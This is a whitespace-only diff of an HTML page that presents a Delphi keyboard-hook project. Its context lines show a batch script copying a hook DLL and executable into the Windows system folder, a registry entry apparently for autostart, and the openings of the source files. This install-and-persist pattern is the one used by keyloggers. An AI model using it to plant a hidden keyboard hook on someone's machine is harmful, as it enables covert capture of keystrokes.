@@ -3,7 +3,7 @@
 
 
 &nbsp;</p>
-<div style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"><table border="0" cellpadding="0" cellspacing="0" style="line-height: normal;"><tr ><td width="13">&#183;</td><td>Setup.bat </td></tr></table></div>
+<div style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"><table border="0" cellpadding="0" cellspacing="0" style="line-height: normal;"><tr><td width="13">&#183;</td><td>Setup.bat</td></tr></table></div>
 <pre>
 @echo off
 copy HookAgnt.dll %windir%\system
@@ -11,7 +11,7 @@ copy kbdhook.exe %windir%\system
 start HookAgnt.reg
 </pre>
 
-<div style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"><table border="0" cellpadding="0" cellspacing="0" style="line-height: normal;"><tr ><td width="13">&#183;</td><td>HookAgnt.reg </td></tr></table></div>
+<div style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"><table border="0" cellpadding="0" cellspacing="0" style="line-height: normal;"><tr><td width="13">&#183;</td><td>HookAgnt.reg</td></tr></table></div>
 <pre>
 REGEDIT4
  
@@ -19,7 +19,7 @@ REGEDIT4
 "kbdhook"="kbdhook.exe"
 </pre>
 
-<div style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"><table border="0" cellpadding="0" cellspacing="0" style="line-height: normal;"><tr ><td width="13">&#183;</td><td>KbdHook.dpr </td></tr></table></div>
+<div style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"><table border="0" cellpadding="0" cellspacing="0" style="line-height: normal;"><tr><td width="13">&#183;</td><td>KbdHook.dpr</td></tr></table></div>
 <pre>
 program cwbhook;
  
@@ -41,7 +41,7 @@ begin
 end.
 </pre>
 
-<p>HookAgnt.dpr </p>
+<p>HookAgnt.dpr</p>
 <pre>
 library HookAgent;
  
@@ -116,7 +116,7 @@ begin
  
 end.
 </pre>
-<p>KeyboardHook.pas </p>
+<p>KeyboardHook.pas</p>
 <pre>
 unit KeyboardHook;
  
